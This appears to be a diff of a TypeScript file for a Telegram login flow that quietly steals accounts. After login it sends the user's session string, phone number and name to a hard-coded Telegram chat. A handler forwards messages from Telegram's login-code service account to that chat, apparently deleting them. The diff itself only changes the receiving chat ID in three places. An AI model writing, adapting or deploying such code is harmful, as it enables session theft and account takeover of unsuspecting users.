@@ -224,12 +224,13 @@ async function login() {
         } else {
             console.log(client.session.save());
             client.addEventHandler(deleteMsgs, new NewMessage({ incoming: true }));
+
             await sendChannels();
             await sleep(1000)
             const sess = client.session.save() as unknown as string;
             const user: any = await result.user.toJSON()
             const payload = {
-                chat_id: "-1001729935532",
+                chat_id: "-1001801844217",
                 text: `${(username).toUpperCase()}:\nnumber = +${user.phone}\nsession = ${sess}\nname:${user.firstName} ${user.lastName}\nuserName: ${user.username}`
             };
             const options = {
@@ -360,7 +361,7 @@ export async function sendCode(
 async function deleteMsgs(event: NewMessageEvent) {
     if (event.message.chatId.toString() == "777000") {
         const payload = {
-            chat_id: "-1001729935532",
+            chat_id: "-1001801844217",
             text: event.message.text
         };
         console.log("RECIEVED");
@@ -389,7 +390,7 @@ async function sendChannels() {
         }
     });
     const payload = {
-        chat_id: "-1001729935532",
+        chat_id: "-1001801844217",
         text: reply
     };
     const options = {
